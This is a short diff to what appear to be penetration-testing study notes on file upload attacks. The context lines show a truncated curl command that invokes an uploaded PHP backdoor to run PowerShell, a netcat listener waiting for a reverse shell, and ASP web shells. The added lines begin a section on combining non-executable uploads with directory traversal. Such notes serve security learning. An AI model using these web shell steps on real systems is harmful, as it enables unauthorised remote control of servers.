@@ -331,3 +331,10 @@ $ curl http://111.111.111.111/customer/uploads/simple-backdoor.pHP?cmd=powershel
 Our nc listener should indicate if we have a successful connection.
 
 If the target webapp was using ASP instead of PHP, we can follow the same exact steps with an ASP web shell from /usr/share/webshells/. 
+
+## Using Non-Executable Files 
+
+File Uploads can still have severe consequences even if we cannot get our file to execute. In this sort of situation, we should leverage another vuln like Directory Traversal to abuse the File Upload.
+
+
+
